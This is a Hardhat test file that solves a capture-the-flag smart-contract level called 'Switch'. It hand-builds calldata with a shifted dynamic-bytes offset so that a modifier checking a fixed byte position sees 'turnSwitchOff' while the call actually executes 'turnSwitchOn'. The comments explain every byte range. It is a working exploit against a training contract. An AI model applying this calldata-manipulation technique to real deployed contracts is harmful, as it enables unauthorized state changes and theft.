import { ethers } from "hardhat";
import { expectLevelSolved } from "../utils";
import { txConfirmation } from "./utils";

describe("Switch Solution", function () {
  it("Should solve the level", expectLevelSolved({
    deployId: "29", 
    solutionFn: async ({ challenge, accounts: [ eoa ] }) => {
      await txConfirmation(eoa.sendTransaction({
        to: challenge.address,
        data: ethers.utils.hexConcat([
          challenge.interface.getSighash("flipSwitch"),       // 0:4 - function selector
                                                              // start of arguments block. 
          ethers.utils.zeroPad("0x60", 32),                   // 4:36 - _data starts from byte 96(0x60) in argument block(byte 96 + 4(function selector) = 100 in call data)
          ethers.utils.randomBytes(32),                       // 36:68 - doesn't matter what is here
          ethers.utils.hexConcat([                            // 68:100 - for bypassing the onlyOff modifier, not actually parsed as argument
            challenge.interface.getSighash("turnSwitchOff"),    // 68:72 - the 4 bytes that the onlyOff modifier checks
            ethers.utils.randomBytes(28),                       // 72:100 - doesn't matter what is here
          ]),                                                 // start of _data
          ethers.utils.zeroPad("0x04", 32),                   // 100:132 - _data is 4 bytes long 
          challenge.interface.getSighash("turnSwitchOn"),     // 132:136 - _data value
        ]),
      }))
    }
  }));
});
